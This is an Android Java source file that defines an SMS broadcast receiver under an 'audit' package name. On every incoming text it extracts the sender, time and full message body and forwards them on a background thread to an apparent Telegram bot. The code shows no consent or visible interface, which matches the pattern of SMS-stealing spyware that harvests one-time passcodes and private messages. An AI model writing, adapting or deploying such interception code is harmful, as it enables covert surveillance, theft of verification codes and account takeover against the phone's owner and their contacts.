package com.sms.audit;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SmsReceiver extends BroadcastReceiver {

    private static final SimpleDateFormat DATE_FORMAT =
        new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);

    @Override
    public void onReceive(Context context, Intent intent) {

        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        Object[] pdus = (Object[]) bundle.get("pdus");
        if (pdus == null) return;

        String format = bundle.getString("format");
        StringBuilder messageBuilder = new StringBuilder();

        for (Object pdu : pdus) {

            SmsMessage sms;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                sms = SmsMessage.createFromPdu((byte[]) pdu, format);
            } else {
                sms = SmsMessage.createFromPdu((byte[]) pdu);
            }

            String sender = sms.getDisplayOriginatingAddress();
            String body = sms.getDisplayMessageBody();
            String time = DATE_FORMAT.format(new Date(sms.getTimestampMillis()));

            messageBuilder.append("\uD83D\uDCE9 *New SMS*\n");
            messageBuilder.append("```\n");
            messageBuilder.append("From: ").append(sender).append("\n");
            messageBuilder.append("Time: ").append(time).append("\n");
            messageBuilder.append("------------------------\n");
            messageBuilder.append(body != null ? body : "(empty)").append("\n");
            messageBuilder.append("```");
        }

        final String finalMessage = messageBuilder.toString();

        new Thread(new Runnable() {
            @Override
            public void run() {
                TelegramBot.sendMessage(finalMessage);
            }
        }).start();
    }
}
